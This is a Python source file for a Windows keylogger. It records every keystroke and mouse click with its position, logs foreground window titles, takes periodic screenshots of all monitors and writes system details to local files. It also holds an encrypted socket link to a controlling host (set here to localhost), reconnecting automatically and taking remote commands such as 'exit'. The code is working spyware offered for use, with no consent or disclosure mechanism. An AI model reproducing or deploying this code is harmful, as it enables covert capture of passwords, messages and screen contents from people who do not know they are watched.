# -*- coding: utf-8 -*-
import keyboard
import mouse
import os
import platform
import pyautogui
import time

from datetime import datetime, timedelta
from functools import partial
from PIL import ImageGrab
from screeninfo import get_monitors
from socket import socket
from threading import Thread
from win32gui import GetWindowText, GetForegroundWindow

import utils

class Keylogger:
    def __init__(self, log_interval, window_interval, reconnect_interval):
        self.active = False
        self.connected = False
        self.filecounter = 0

        self.log_interval = log_interval
        self.log = ""

        self.window_interval = window_interval
        self.foreground_window = ""

        self.start_time = datetime.now()
        self.end_time = datetime.now()

        self.reconnect_interval = reconnect_interval
        self.sock = socket()
        self.host = "127.0.0.1"
        self.port = 1005

        self.log_directory = "tmp" #"C:\\tmp"

        ImageGrab.grab = partial(ImageGrab.grab, all_screens=True) # Take Screenshots of all Screens at once

#--------------- CALLBACK FUNCTIONS ---------------#
    def keyboard_callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    def mouse_left_callback(self):
        self.log += f"[L_CLICK, {mouse.get_position()}]"

    def mouse_right_callback(self):
        self.log += f"[R_CLICK, {mouse.get_position()}]"

#--------------- WRITE FUNCTIONS ---------------#
    def write_information_file(self):
        if not os.path.exists(self.log_directory):
                os.makedirs(self.log_directory)

        filename = f"information-{self.start_time.strftime('%Y-%m-%d-%H-%M-%S')}.txt"
        with open(os.path.join(self.log_directory, filename), "w+", encoding="utf-8") as file:
            uname = platform.uname()

            file.write("Monitors:\n")
            for m in get_monitors():
                file.write((
                        f"\tname: {m.name}\n"
                        f"\tx: {m.x}\n"
                        f"\ty: {m.y}\n"
                        f"\twidth (pixel): {m.width}\n"
                        f"\theight (pixel): {m.height}\n"
                        f"\twidth (mm): {m.width_mm}\n"
                        f"\theight (mm): {m.height_mm}\n"
                        f"\tis primary?: {m.is_primary}\n\n"
                    ))
            file.write((
                        f"System: {uname.system}\n"
                        f"Node Name: {uname.node}\n"
                        f"Release: {uname.release}\n"
                        f"Version: {uname.version}\n"
                        f"Machine: {uname.machine}\n"
                        f"Processor: {uname.processor}\n"
                    ))

    def write_keylogs_to_file(self, foreground_window):
        if self.log:
            if not os.path.exists(self.log_directory):
                os.makedirs(self.log_directory)

            filename = f"keylog-{self.start_time.strftime('%Y-%m-%d-%H-%M-%S')}-{self.end_time.strftime('%Y-%m-%d-%H-%M-%S')}.txt"
            with open(os.path.join(self.log_directory, filename), "w", encoding="utf-8") as file:
                file.write((
                        f"Foreground Window: {foreground_window}\n"
                        f"Starttime: {self.start_time.strftime('%Y-%m-%d-%H-%M-%S')}\n"
                        f"Endtime: {self.end_time.strftime('%Y-%m-%d-%H-%M-%S')}\n"
                        f"Filecounter: {self.filecounter}\n"
                        f"------------------------\n\n"
                        f"{self.log}"
                    ))
            self.start_time = datetime.now()
        self.log = ""

    def screenshot(self):
        if not os.path.exists(self.log_directory):
                os.makedirs(self.log_directory)
        
        filename = f"screenshot-{self.start_time.strftime('%Y-%m-%d-%H-%M-%S')}-{self.end_time.strftime('%Y-%m-%d-%H-%M-%S')}.png"
        pyautogui.screenshot(os.path.join(self.log_directory, filename))

#--------------- SERVER FUNCTIONS ---------------#
    def connect_to_host(self):
        while not self.connected:
            try:
                self.sock.connect((self.host, self.port))
                self.connected = True
            except:
                self.connected = False
                time.sleep(self.reconnect_interval)

    def send_to_host(self, data):
        encrypted_data = utils.encrypt(data)

        try:
            self.sock.sendall(encrypted_data)
        except:
            self.connected = False
            self.connect_to_host()

    def receive_from_host(self):
        recv = utils.decrypt(self.sock.recv(1024))
        if recv:
            return str(recv)[2:-1]
        return None
    
#--------------- POLLING FUNCTIONS ---------------#
    def check_foreground_window(self):
        while self.active:
            current_window = GetWindowText(GetForegroundWindow())
            timenow = datetime.now()

            if current_window != self.foreground_window:
                self.write_keylogs_to_file(self.foreground_window)
                self.screenshot()
                self.foreground_window = current_window
                self.filecounter = 0

            elif (timenow - self.start_time) >= timedelta(seconds=self.log_interval):
                self.end_time = timenow
                self.write_keylogs_to_file(current_window)
                self.screenshot()
                self.filecounter += 1

            time.sleep(self.window_interval)

#--------------- START / STOP ---------------#
    def start(self):
        self.active = True
        self.write_information_file()

        keyboard.on_press(callback=self.keyboard_callback)
        mouse.on_click(callback=self.mouse_left_callback)
        mouse.on_right_click(callback=self.mouse_right_callback)

        t = Thread(target=self.check_foreground_window)
        t.start()

    def stop(self):
        self.active = False
        self.send_to_host(b'terminated')
        self.sock.close()


#--------------- MAIN ---------------#
if __name__ == "__main__":
    keylogger = Keylogger(log_interval=15, window_interval=0.25, reconnect_interval=5)
    keylogger.start()
    keylogger.connect_to_host()

    while True:
        recv = keylogger.receive_from_host()
        if recv:
            if recv == "exit":
                keylogger.stop()
                break
            else:
                keylogger.send_to_host(b'received')
                print(recv)
